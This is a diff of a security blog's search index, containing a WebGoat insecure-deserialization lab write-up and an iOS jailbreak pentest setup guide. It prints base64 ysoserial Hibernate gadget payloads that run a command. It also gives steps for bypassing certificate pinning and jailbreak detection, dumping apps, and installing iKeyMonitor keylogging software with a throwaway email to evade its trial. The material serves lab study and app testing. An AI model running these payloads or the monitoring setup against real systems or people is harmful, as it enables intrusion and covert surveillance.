wveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
-<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
-<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
-
-<p>在maven中添加</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
-  </entry>
-  <entry>
-    <title>iOS 12.4越狱+配置过程记录</title>
-    <url>/2020/03/31/iOS-jailbreak/</url>
-    <content><![CDATA[<h1 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h1><p>在 <a href="https://checkra.in/#release" target="_blank" rel="noopener">https://checkra.in/#release</a> 中下载，其中能越狱的设备有iPhone 5s – iPhone X, iOS 12.3 and up</p>
-<p>我的设备是iPhone SE(A9)，iOS版本12.4</p>
-<a id="more"></a>
-
-<img src="/2020/03/31/iOS-jailbreak/checkra1n-latest-release.png" alt="checkra1n-latest-release" style="zoom: 67%;">
-
-<p>下载完成后，将手机通过数据线连接Mac，运行checkra1n，点击start</p>
-<img src="/2020/03/31/iOS-jailbreak/run-checkra1n.png" alt="run-checkra1n" style="zoom:43%;">
-
-<p>一直点击next，直到如下画面，根据以下提示按键</p>
-<ol>
-<li>点击Start</li>
-<li>同时按住关机键和home键</li>
-<li>松开关机键，持续按住home键</li>
-</ol>
-<img src="/2020/03/31/iOS-jailbreak/checkra1n-start-jailbreak.png" alt="checkra1n-start-jailbreak" style="zoom: 43%;">
-
-<p>之后等待一会，程序安装完成之后，iPhone会重启。</p>
-<p>重启完成后输入密码，进行系统，点开checkra1n应用，安装Cydia。</p>
-<p>（安装Cydia最好翻墙，翻墙很快下完，不翻墙下载失败）</p>
-<img src="/2020/03/31/iOS-jailbreak/checkra1n-jailbreak-success.png" alt="checkra1n-jailbreak-success" style="zoom:33%;">
-
-<p>整个越狱流程就结束了，非常简单快捷。</p>
-<h1 id="iProxy"><a href="#iProxy" class="headerlink" title="iProxy"></a>iProxy</h1><p>安装完Cydia之后可以来安装iProxy。iProxy的用处是通过USB进行SSH连接手机，虽然Wi-Fi就能通过SSH连接，但是稳定性和传输速度比不上USB。</p>
-<p>在Mac上执行：<code>brew install libusbmuxd</code>，安装完成之后将手机的端口映射到其他端口上：<code>iproxy 2222 22</code>,在令一个终端页面输入<code>ssh root@localhost -p 2222</code>开始连接，密码是alpine。</p>
-<p>⚠️ 我连接SSH时出现问题，报错内容如下</p>
-<img src="/2020/03/31/iOS-jailbreak/iproxy-error.png" alt="iproxy-error" style="zoom:50%;">
-
-<p>我的解决办法就是重新安装openssh，重装后就能正常连接</p>
-<img src="/2020/03/31/iOS-jailbreak/iproxy-success.png" alt="iproxy-success" style="zoom:50%;">
-
-
-
-<h1 id="Frida-and-Objection"><a href="#Frida-and-Objection" class="headerlink" title="Frida and Objection"></a>Frida and Objection</h1><p>Frida安装教程：<a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
-<p>在Mac执行：<code>pip3 install frida-tools</code></p>
-<p>需要在iPhone上执行的操作：打开Cydia -&gt; 点击底部栏“软件源” -&gt; 点击右上角“编辑” -&gt; 点击左上角“添加”，然后输入 <a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a></p>
-<p>完成之后，点击新增的源找到“build.frida.re”点击进去，里面有三个可选项，分别是“Frida for 32-bit devices”、“Frida for A12+ devices”、“Frida for pre-A12 devices”，32-bit是iPhone 5s和iPad Air（不含）以下的设备，A12+是iPhone X（不含）以上的设备。</p>
-<p>因为我的设备是iPhone SE，芯片型号是A9，所以选择“Frida for pre-A12 devices”</p>
-<p>安装完Firda之后，继续安装Objection。</p>
-<p>在Mac上执行<code>pip3 install objection</code>，安装完成之后可以运行<code>objection --gadget &quot;com.apple.AppStore&quot; explore</code>来测试一下</p>
-<img src="/2020/03/31/iOS-jailbreak/objection-install.png" alt="objection-install" style="zoom:50%;">
-
-
-
-<p>⚠️ 如果安装的是“Frida for A12+ devices”，使用Frida时需要开启Xcode来挂载硬盘镜像。</p>
-<img src="/2020/03/31/iOS-jailbreak/objection-error.png" alt="objection-error" style="zoom:50%;">
-
-
-
-<h1 id="证书配置和安装SSL-Kill-Switch-2"><a href="#证书配置和安装SSL-Kill-Switch-2" class="headerlink" title="证书配置和安装SSL Kill Switch 2"></a>证书配置和安装SSL Kill Switch 2</h1><p>证书配置非常简单，设置好burp代理，访问 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> ，安装证书。</p>
-<p>安装证书之后在 设置 -&gt; 通用 -&gt; 描述文件 -&gt; PortSwigger CA，点击安装。</p>
-<p>再到 通用 -&gt; 关于本机 -&gt; 证书信任设置，选上PortSwigger即可。</p>
-<img src="/2020/03/31/iOS-jailbreak/certificate-trust.png" alt="certificate-trust" style="zoom:33%;">
-
-
-
-<p>重点是安装SSL Killing，app测试时很多应用都会强制使用certificate pinning导致无法抓包，安装<a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="noopener">SSL Kill Switch 2</a>可帮助我们绕过certificate pinning。</p>
-<ol>
-<li>安装前先确定Cydia中安装了以下packages：<code>wget</code>、<code>Debian Packager</code>、<code>Cydia Substrate</code>、<code>PreferenceLoader</code></li>
-</ol>
-<p>⚠️ 找不到PreferenceLoader，可添加源：<a href="https://rpetri.ch/repo" target="_blank" rel="noopener">https://rpetri.ch/repo</a> ，再安装。</p>
-<ol start="2">
-<li>在<a href="https://github.com/nabla-c0d3/ssl-kill-switch2/releases" target="_blank" rel="noopener">SSL Kill Switch 2 release</a>中复制最新的<code>.deb</code>链接</li>
-<li>使用SSH连接iPhone，运行<code>wget &lt;RELEASE URL FROM STEP 2&gt;</code> -&gt; <code>dpkg -i &lt;DOWNLOAD PACKAGE NAME&gt;</code> -&gt;killall -HUP SpringBoard，确定安装成功后<code>rm &lt;DOWNLOAD PACKAGE NAME&gt;</code></li>
-<li>打开iPhone，在设置 -&gt; SSL Kill Switch 2（设置的最下方） -&gt; 勾选Disable Certificate Validation</li>
-</ol>
-<img src="/2020/03/31/iOS-jailbreak/SSL-Kill-Switch.png" alt="SSL-Kill-Switch" style="zoom:33%;">
-
-
-
-<h1 id="绕过越狱检测"><a href="#绕过越狱检测" class="headerlink" title="绕过越狱检测"></a>绕过越狱检测</h1><h3 id="Liberty"><a href="#Liberty" class="headerlink" title="Liberty"></a>Liberty</h3><p>iPhone上打开Cydia，添加源<code>https://ryleyangus.com/repo/</code>，之后搜索<code>Liberty Lite</code>，安装即可。</p>
-<p>安装完成之后在设置中开启Liberty，再点击Block Jailbreak Detection中选择需要绕过越狱检测的iOS应用。</p>
-<img src="/2020/03/31/iOS-jailbreak/liberty.png" alt="liberty" style="zoom:33%;">
-
-<p>如果在某些APP中不生效，也可以尝试其他插件，比如xCon。</p>
-<h3 id="xCon"><a href="#xCon" class="headerlink" title="xCon"></a>xCon</h3><p>在Cydia中添加源 <a href="http://xcon.crazy.net/" target="_blank" rel="noopener">http://xcon.crazy.net</a> ，进入添加的源中选择xCon下载安装即可。</p>
-<p>xCon会绕过以下越狱检测方法（1）根据是否存在特定的越狱文件，及特定文件的权限是否发生变化来判断设备是否越狱（2）根据沙箱完整性检测设备是否越狱（3）根据文件系统的分区是否发生变化来检测设备是否越狱（4）根据是否安装ssh来判断设备是否越狱</p>
-<h1 id="导出APP文件"><a href="#导出APP文件" class="headerlink" title="导出APP文件"></a>导出APP文件</h1><p>导出APP是一个非常有用的功能，导出之后的文件没有壳，拖到IDA中直接反编译就行，非常方便，谁用谁知道。</p>
-<ol>
-<li>在Mac中输入<code>git clone https://github.com/AloneMonkey/frida-ios-dump.git &amp;&amp; cd frida-ios-dump</code></li>
-<li><code>sudo pip3 install -r requirements.txt --upgrade</code></li>
-<li>在另一个终端输入<code>iproxy 2222 22</code></li>
-<li><code>python3 dump.py -l</code>列举iPhone上所有的应用，<code>python3 ./dump.py &lt;APP DISPLAY NAME OR BUNDLE IDENTIFIER&gt;</code>导出APP文件。</li>
-</ol>
-<h1 id="安装Apple-File-Conduit-2"><a href="#安装Apple-File-Conduit-2" class="headerlink" title="安装Apple File Conduit 2"></a>安装Apple File Conduit 2</h1><p>iOS9以上无法通过第三方软件读取应用文件，安装Apple File Confuit2可绕过该限制。</p>
-<p>在Cydia中搜索“Apple File Confuit2”即可</p>
-<p>APP文件目录：    </p>
-<p>a) iOS7及之前：/Device/private/var/mobile/Application/UUID/XXXXX.app/</p>
-<p>b) iOS8：/var/mobile/Containers/Bundle/Application/UUID/</p>
-<p>c) iOS9/10/12：/var/containers/Bundle/Application/UUID/</p>
-<h1 id="添加mem-check"><a href="#添加mem-check" class="headerlink" title="添加mem-check"></a>添加mem-check</h1><p>已经安装好OpenSSH，可以使用sftp将mem-check文件上传到iPhone中。</p>
-<p>在本机输入<code>sftp -P 2222 root@localhost</code>，再输入密码<code>alpine</code>进入sftp模式</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ sftp -P 2222 root@localhost</span><br><span class="line">root@localhost<span class="string">'s password: alpine</span></span><br><span class="line"><span class="string">Connected to localhost.</span></span><br></pre></td></tr></table></figure>
-
-<p>进入sftp模式后，使用put将文件上传至iPhone中，上传文件路径为本机的路径</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sftp&gt; put /Tmp/mem-check</span><br><span class="line">Uploading /Tmp/mem-check to /private/var/root/mem-check</span><br><span class="line">/Tmp/mem-check                                       100%  132KB   8.2MB/s   00:00</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后给mem-check加上执行权限，</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x mem-check</span><br></pre></td></tr></table></figure>
-
-<p>先用ps命令得到APP的PID，再利用mem-check –p PID –s STRING对APP内存进行搜索</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ root<span class="comment"># ps A | grep XXX</span></span><br><span class="line">~ root<span class="comment"># mem-check -p 1234 -s password</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="iKeyMonitor安装"><a href="#iKeyMonitor安装" class="headerlink" title="iKeyMonitor安装"></a>iKeyMonitor安装</h1><p>iKeyMonitor安装直接在Cydia中搜索iKeyMonitor即可</p>
-<p>iKeymonitor只有三天试用时间，使用十分钟邮箱（<a href="http://mail.bccto.me/" target="_blank" rel="noopener">http://mail.bccto.me/</a> ）获取一个随机的邮箱，然后在官网进行注册（ <a href="https://ikeymonitor.com/" target="_blank" rel="noopener">https://ikeymonitor.com/</a> ）</p>
-<p>官网选择sign up -&gt; iPhone/iPad -&gt; The iPhone/iPad can be Jailbroken, and I can get it in my hand and jailbreak it -&gt; 填写User ID 和 Email</p>
-<p>然后会收到一封邮件，点击查看可得到许可证号，使用许可证登录即可</p>
-<p><img src="/2020/03/31/iOS-jailbreak/iKeyMonitor.png" alt="iKeyMonitor"></p>
-<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13" target="_blank" rel="noopener">https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13</a></p>
-<p><a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
-<p><a href="https://github.com/sensepost/objection/wiki/Screenshots" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Screenshots</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -1532,6 +1421,195 @@
 <blockquote>
 <p><strong>代码审计关键</strong>：关注<code>th:utext</code>，<code>th:utext</code>中的内容用户可控则存在XSS。</p>
 </blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>WebGoat - 不安全的反序列化</title>
+    <url>/2019/09/28/WebGoat-Deserialization/</url>
+    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
+<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
+<p>最早的一篇讲解Webgoat反序列化的文章</p>
+<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
+<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
+<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
+<p>另一篇文章</p>
+<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
+<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
+<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
+<p>然后将请求Send request to DS - Exploitation</p>
+<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
+<p>详细报错信息如下所示</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
+<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
+<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
+<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
+<blockquote>
+<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
+</blockquote>
+<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
+<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
+<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
+<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
+<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
+<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
+<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
+<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
+<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>最终效果图如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
+<p>payload也贴一下吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludG